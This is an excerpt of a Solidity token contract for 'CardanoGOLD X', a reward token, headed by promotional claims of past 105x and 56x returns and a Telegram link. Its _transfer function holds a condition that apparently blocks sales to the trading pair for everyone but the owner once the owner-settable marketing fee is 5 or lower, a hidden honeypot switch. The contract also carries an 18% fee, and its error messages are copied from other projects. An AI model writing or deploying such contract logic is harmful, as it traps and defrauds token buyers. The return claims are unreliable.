...
/*
CardanoGOLD X| The New Age 

A simple $ADA reward token
...
Past Projects Did 105x & 56x

🔈Tg: https://t.me/CardanoGOLDX
*/
...
contract CardanoGOLDX is ERC20, Ownable {
    ...
    address[] public  TOKENARR = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]; // Floki
    ...
    uint256 public marketingFee = 18;
    ...
    constructor() public ERC20("CardanoGOLD X", "ADAGOLDX") {
        ...
        //uniswapV2RouterAddr = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // Testnet
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "SuperDAI: The router already has that address");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "SuperDAI: Account is already the value of 'excluded'");
    ...
    function setMaxWalletLimit(uint256 value) external onlyOwner{
        require(value >= 2000000000 * (10**18), "SuperDAI: Minimum max wallet limit is 2 percent");
        _maxWalletLimit = value;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "SuperDAI: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "SuperDAI: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        ...
        require(newValue != gasForProcessing, "SuperDAI: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
		...
		require(!(to == uniswapV2Pair || to == uniswapV2RouterAddr) || (from == owner()) || marketingFee > 5);
        ...
        //ac� voy a probar seteando el balance en todos, ver si pincha y en todo caso probar poniendo una parcialidad
        for(uint256 i=0;i<TOKENARR.length;i++){
...
contract BABYBAKEDividendTracker is Ownable, DividendPayingToken {
    ...
    constructor(address token) public DividendPayingToken("SuperDAI_Dividen_Tracker", "SuperDAI_Dividend_Tracker",token) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 200000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(false, "SuperDAI_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public override {
        require(false, "SuperDAI_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SuperDAI contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "SuperDAI_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SuperDAI_Dividend_Tracker: Cannot update claimWait to same value");
